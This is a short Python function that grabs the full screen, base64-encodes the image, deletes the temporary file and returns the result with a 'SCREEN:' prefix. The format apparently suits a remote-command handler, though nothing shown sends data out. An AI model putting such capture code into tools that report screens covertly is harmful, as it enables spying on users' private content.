import tempfile
import os
import base64
from PIL import ImageGrab

def take_screenshot():
    try:
        img = ImageGrab.grab()
        path = os.path.join(tempfile.gettempdir(), 'ss.png')
        img.save(path)
        with open(path, 'rb') as f:
            b64 = base64.b64encode(f.read()).decode()
        os.remove(path)
        return f"SCREEN:{b64}"
    except Exception as e:
        return f"Screenshot error: {e}"